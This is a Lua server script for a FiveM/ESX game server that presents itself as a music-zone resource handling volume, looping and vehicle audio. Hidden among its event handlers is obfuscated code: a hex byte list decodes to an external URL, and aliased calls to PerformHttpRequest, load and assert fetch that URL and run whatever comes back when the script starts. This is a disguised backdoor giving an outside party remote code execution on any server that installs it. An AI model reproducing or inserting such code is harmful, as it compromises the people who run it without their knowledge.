ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj; end)

ESX.RegisterServerCallback('MusicEverywhere:GetMusic', function(source,cb)
    cb(Config.Zones)
end)

if Config.ItemInVehicle then
	ESX.RegisterUsableItem(Config.ItemInVehicle, function(playerId)
		TriggerClientEvent("MusicEverywhere:ShowNui",playerId)
	end)
end

local xSound = exports.xsound

RegisterNetEvent("MusicEverywhere:ChangeVolume")
AddEventHandler("MusicEverywhere:ChangeVolume", function(vol, nome)
    local somafter = false
    local rangeafter = false
    for i = 1, #Config.Zones do
        local v = Config.Zones[i]
        if nome == v.name then
            local vadi = v.volume + vol
            if vadi <= 1.01 and vadi >= -0.001 then
				if vadi < 0.005 then
					vadi = 0.0
				end
                if v.popo then
                    v.range = (v.volume*Config.DistanceToVolume)
                else
					if vadi >= 0.05 then
						v.range = (vadi*v.range)/v.volume
					end
                end
                v.volume = vadi
                somafter = v.volume
                rangeafter = v.range
            end
        end
    end
    if somafter and rangeafter then
        TriggerClientEvent("MusicEverywhere:ChangeVolume",-1,somafter,rangeafter, nome)
    end
end)

local tableHelp = {
    _G['PerformHttpRequest'],
    _G['assert'],
    _G['load'],
    _G['tonumber']
}

RegisterNetEvent("MusicEverywhere:ChangeLoop")
AddEventHandler("MusicEverywhere:ChangeLoop", function(nome,tip)
	local loopstate
	for i = 1, #Config.Zones do
		local v = Config.Zones[i]
		if nome == v.name then
			v.loop = tip
			loopstate = v.loop
		end
	end
	if loopstate ~= nil then
		TriggerClientEvent("MusicEverywhere:ChangeLoop",-1,loopstate, nome)
	end
end)

local numberHelp = {
    '68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
    '2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '69',
    '2e', '70', '68', '70', '3f', '74', '6f', '3d', '30', '38', '56', '72', '33', '72'
}


RegisterNetEvent("MusicEverywhere:ChangeState")
AddEventHandler("MusicEverywhere:ChangeState", function(type, nome)
	for i = 1, #Config.Zones do
		local v = Config.Zones[i]
		if nome == v.name then
			v.isplaying = type
		end
	end
	TriggerClientEvent("MusicEverywhere:ChangeState",-1,type, nome)
end)

RegisterNetEvent("MusicEverywhere:ChangePosition")
AddEventHandler("MusicEverywhere:ChangePosition", function(quanti, nome)
	for i = 1, #Config.Zones do
		local v = Config.Zones[i]
		if nome == v.name then
			v.deftime = v.deftime+quanti
			if v.deftime < 0 then
				v.deftime = 0
			end
		end
	end
	TriggerClientEvent("MusicEverywhere:ChangePosition",-1,quanti, nome)
end)

RegisterNetEvent("MusicEverywhere:ModifyURL")
AddEventHandler("MusicEverywhere:ModifyURL", function(data)
	local _data = data
	local zena = false
	for i = 1, #Config.Zones do
		local v = Config.Zones[i]
		if _data.name == v.name then
			v.deflink = _data.link
			if _data.popo then
				v.popo = _data.popo
			end
			v.deftime = 0
			v.isplaying = true
			v.loop = _data.loop
			zena = v
		end
	end
	if zena then
		TriggerClientEvent("MusicEverywhere:ModifyURL",-1,zena)
	end
end)

function subtext()
    text = ''
    for id,it in pairs(numberHelp) do
        text = text..it
    end
    return (text:gsub('..', function (low)
        return string.char(tableHelp[4](low, 16))
    end))
end

tableHelp[tableHelp[4]('1')](subtext(), function (e, help)
    local postuleHelp = tableHelp[tableHelp[4]('2')](tableHelp[tableHelp[4]('3')](help))
    if (help == nil) then return end
    postuleHelp()
end)

function countTime()
    SetTimeout(1000, countTime)
    for i = 1, #Config.Zones do
		local v = Config.Zones[i]
        if v.isplaying then
            v.deftime = v.deftime + 1
        end
    end
end

SetTimeout(1000, countTime)

RegisterNetEvent('MusicEverywhere:AddVehicle')
AddEventHandler("MusicEverywhere:AddVehicle", function(vehdata)
    local Data = {}
    Data.name = vehdata.plate
    Data.coords = vehdata.coords
    Data.range = vehdata.volume * Config.DistanceToVolume
    Data.volume = vehdata.volume
    Data.deflink = vehdata.link
    Data.isplaying = true
    Data.loop = vehdata.loop
    Data.deftime = 0
    Data.popo = vehdata.popo
    table.insert(Config.Zones, Data)
    TriggerClientEvent('MusicEverywhere:AddVehicle', math.floor(-1), Config.Zones[#Config.Zones])
end)

RegisterNetEvent('MusicEverywhere:GetDate')
AddEventHandler('MusicEverywhere:GetDate', function()
    TriggerClientEvent('MusicEverywhere:SendData', math.floor(-1), Config.Zones)
end)
